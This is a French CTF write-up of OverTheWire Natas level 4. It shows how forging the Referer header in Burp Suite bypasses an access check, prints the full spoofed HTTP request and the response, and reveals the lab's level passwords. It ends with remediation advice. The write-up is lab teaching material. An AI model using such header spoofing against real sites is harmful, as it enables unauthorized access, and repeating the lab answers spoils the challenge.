# OVERTHEWIRE

**OVERTHEWIRE** Natas  4  

**Category :** web-security   

**Points :**  ✅  

**Status :** Résolu ✅

---

## 🎯 Challenge
- L'objectif de cette épreuve est de récupérer les identifiants requis pour s'authentifier au niveau supérieur de Natas.
 ![](images/1.png)
---
## ⚡ Solution  
-  Quand nous nous connectons à Natas 4, on nous dit que les utilisateurs autorisés sont ceux qui proviennent de Natas 5.
-  Nous initions la connexion vers Natas 4, puis nous analysons l'historique du proxy HTTP dans Burp Suite afin d'isoler la requête générée. Nous localisons ensuite l'en-tête Referer au sein de cette requête pour préparer sa modification.
![](images/2.png)  

---
**Payload utilisé :**   
---
- Action : Envoi de la requête contenant le Referer vers le Repeater.  
- Manipulation : Remplacement de la valeur actuelle par l'URL de Natas 5.  
- Résultat attendu : Émission de la requête et capture de la réponse pour obtenir le flag.  
---   



```http
GET /index.php HTTP/1.1
Host: natas4.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXM0OkpEclBudVpBS3lsNk1raXFRR0ZJZGRycXB2Z09BU3Ro
Connection: keep-alive
Referer: http://natas5.natas.labs.overthewire.org/
Cookie: _ga_RD0K2239G0=GS2.1.s1787161207$o1$g0$t1787161207$j60$l0$h0; _ga=GA1.1.1589891757.1787161208
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```  

**Réponse :**  

```http  
</script>
<script>var wechallinfo = { "level": "natas4", "pass": "JDrPnuZAKyl6MkiqQGFIddrqpvgOASth" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
```  
![](images/repeater.png)

## 🚩 Flag
---
Access granted. The password for natas5 is e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
---
## 🛡️ Remédiation   

- Ne jamais utiliser l'en-tête Referer pour contrôler l'accès : Les en-têtes HTTP envoyés par le navigateur (comme le Referer ou le User-Agent) sont entièrement contrôlés par l'utilisateur et peuvent être facilement modifiés ou falsifiés à l'aide d'un outil comme Burp Suite. Pour restreindre l'accès à une page, le serveur doit utiliser des mécanismes de sécurité robustes, tels que des sessions utilisateur sécurisées ou des jetons d'authentification (tokens) générés côté serveur


## 💡 Points Clés à Retenir  
- La faille : Validation d'autorisation basée sur des données non fiables provenant du client (Client-Side Trust).
- Le réflexe CTF : Dès qu'une application web restreint l'accès en fonction de la provenance géographique, du navigateur utilisé ou de la page précédente, il faut immédiatement penser à intercepter la requête pour manipuler les en-têtes HTTP correspondants (Referer, User-Agent, X-Forwarded-For).


---
*Malick Ramzy SOPODOU — OVERTHEWIRE Natas 🌍*
